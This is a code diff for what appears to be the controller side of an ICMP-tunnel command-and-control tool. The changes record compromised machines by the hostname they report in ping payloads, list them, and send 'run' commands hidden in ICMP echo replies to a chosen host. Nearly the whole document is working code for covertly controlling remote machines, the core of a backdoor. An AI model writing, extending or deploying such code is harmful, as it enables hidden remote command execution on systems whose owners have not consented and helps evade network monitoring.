@@ -5,7 +5,7 @@
 #include <string>
 #include <thread>
 #include <mutex>
-#include <set>
+#include <map>
 #include <vector>
 #include <sstream>
 
@@ -19,7 +19,7 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
-static std::set<std::string> cur_connections;
+static std::map<std::string, std::string> cur_connections;
 static std::mutex cur_connections_mutex;
 
 static uint16_t checksum(void *vdata, uint32_t size)
@@ -84,9 +84,10 @@ long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
 {
   uint8_t out[1024];
   icmphdr *icmp = (icmphdr *)out;
-  icmp->type = 8;
+  icmp->type = 0;
   icmp->code = 0;
   icmp->checksum = 0;
+  icmp->un.echo.sequence++;
 
   if (buf && size > 0)
   {
@@ -120,7 +121,8 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
   iphdr *ip = (iphdr *)in;
   if (ret > sizeof(iphdr))
   {
-    char *src_ = (char *)(in + sizeof(iphdr) + sizeof(icmphdr));
+    in_addr addr{ip->saddr};
+    char *src_ = inet_ntoa(addr);
     src = src_;
 
     if (ret > sizeof(iphdr) + sizeof(icmphdr))
@@ -133,45 +135,6 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
   }
 
   return ret;
-}
-
-std::string lookup_host(const std::string &host)
-{
-  struct addrinfo hints, *res, *result;
-  int errcode;
-  char addrstr[100];
-  void *ptr;
-
-  memset(&hints, 0, sizeof(hints));
-  hints.ai_family = PF_UNSPEC;
-  hints.ai_socktype = SOCK_STREAM;
-  hints.ai_flags |= AI_CANONNAME;
-
-  errcode = getaddrinfo(host.c_str(), NULL, &hints, &result);
-  if (errcode != 0)
-  {
-    perror("getaddrinfo");
-    return "";
-  }
-
-  res = result;
-
-  inet_ntop(res->ai_family, res->ai_addr->sa_data, addrstr, 100);
-
-  switch (res->ai_family)
-  {
-  case AF_INET:
-    ptr = &((struct sockaddr_in *)res->ai_addr)->sin_addr;
-    break;
-  case AF_INET6:
-    ptr = &((struct sockaddr_in6 *)res->ai_addr)->sin6_addr;
-    break;
-  }
-  inet_ntop(res->ai_family, ptr, addrstr, 100);
-
-  freeaddrinfo(result);
-
-  return addrstr;
 }
 
 void listen_task()
@@ -190,10 +153,13 @@ void listen_task()
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
 
+    char *hostname_ = (char *)in;
+    std::string hostname = hostname_;
+
     if (num_bytes > 0)
     {
       std::lock_guard<std::mutex> guard(cur_connections_mutex);
-      cur_connections.insert(src_ip);
+      cur_connections[hostname] = src_ip;
     }
   }
 }
@@ -207,53 +173,11 @@ void send_command(const std::string &dst, const std::string &command)
     exit(-1);
   }
 
-  std::vector<uint8_t> data{command.begin(), command.end()};
+  std::string cmd = "run ";
+  cmd.append(command);
 
-  long ret = 0;
-  uint8_t in[1024];
-  if ((ret = read(sockfd, in, sizeof(in))) == -1)
-  {
-    return;
-  }
-
-  // iphdr *ip = (iphdr *)in;
-  //   if (ret > sizeof(iphdr))
-  //   {
-  //     char *src_ = (char *)(in + sizeof(iphdr) + sizeof(icmphdr));
-  //     src = src_;
-
-  //     if (ret > sizeof(iphdr) + sizeof(icmphdr))
-  //     {
-  //       if (buf && size > 0)
-  //       {
-  //         memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), size);
-  //       }
-  //     }
-  //   }
-
-  iphdr *ip = (iphdr *)in;
-  if (ret > sizeof(iphdr))
-  {
-    icmphdr *icmp = (icmphdr *)(in + sizeof(iphdr));
-    icmp->type = 0;
-    icmp->un.echo.sequence++;
-
-    sockaddr_in addr_;
-    addr_.sin_family = AF_INET;
-    addr_.sin_port = htons(0);
-    addr_.sin_addr.s_addr = inet_addr(dst.c_str());
-
-    memcpy((char *)(in + sizeof(iphdr) + sizeof(icmphdr)), data.data(), data.size());
-
-    icmp->checksum = 0x00;
-    icmp->checksum = htons(checksum(icmp, sizeof(icmphdr) + data.size()));
-
-    long ret;
-    if ((ret = sendto(sockfd, icmp, sizeof(icmphdr) + data.size(), 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
-    {
-      perror("sendto");
-    }
-  }
+  std::vector<uint8_t> data{cmd.begin(), cmd.end()};
+  send_ping(sockfd, dst, data.data(), data.size());
 }
 
 std::vector<std::string> split_input(std::string &input)
@@ -293,9 +217,11 @@ int main(int argc, char **argv)
     {
       std::puts("Listing current machines!");
       std::lock_guard<std::mutex> guard(cur_connections_mutex);
-      for (auto &addr : cur_connections)
+
+      auto it = cur_connections.begin();
+      for (it; it != cur_connections.end(); it++)
       {
-        std::cout << "\t" << addr << "\n";
+        std::cout << it->first << ": " << it->second << "\n";
       }
     }
     else if (input_arr.at(0).compare("run") == 0)
@@ -306,7 +232,7 @@ int main(int argc, char **argv)
         continue;
       }
 
-      std::string ip = lookup_host(input_arr.at(1));
+      std::string ip = cur_connections[input_arr.at(1)];
       std::string command;
       for (int i = 2; i < input_arr.size(); i++)
       {
